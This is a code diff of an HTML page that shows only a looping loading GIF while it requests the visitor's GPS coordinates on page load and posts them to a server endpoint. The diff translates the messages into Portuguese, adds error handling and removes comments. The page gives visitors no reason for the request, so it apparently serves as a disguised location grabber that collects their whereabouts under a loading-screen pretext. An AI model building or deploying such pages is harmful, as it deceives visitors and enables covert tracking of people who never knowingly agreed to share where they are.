@@ -21,20 +21,19 @@
     </style>
 </head>
 <body>
-    <!-- Gif de login em loop -->
+    
     <img id="loadingGif" src="/static/loading.gif" alt="Loading..." />
     
     <script>
-        // gps location
+        
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocation, showError);
             } else {
-                console.error("geolocation not supported.");
+                console.error("Geolocalização não suportada pelo navegador.");
             }
         }
 
-        // send location
         function sendLocation(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
@@ -44,8 +43,7 @@
                 longitude: longitude
             };
 
-            // send to /save
-            fetch("/save", {
+            fetch("/salvar_localizacao", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
@@ -54,14 +52,30 @@
             })
             .then(response => response.json())
             .then(data => {
-                console.log("Saved!", data);
+                console.log("Localização salva com sucesso!", data);
             })
             .catch(error => {
-                console.error("Error", error);
+                console.error("Erro ao enviar a localização", error);
             });
         }
 
-        // call the function
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    console.error("Usuário negou a permissão de geolocalização.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    console.error("A posição geográfica não está disponível.");
+                    break;
+                case error.TIMEOUT:
+                    console.error("A solicitação de geolocalização expirou.");
+                    break;
+                default:
+                    console.error("Erro desconhecido.");
+                    break;
+            }
+        }
+
         window.onload = function() {
             getLocation();
         }
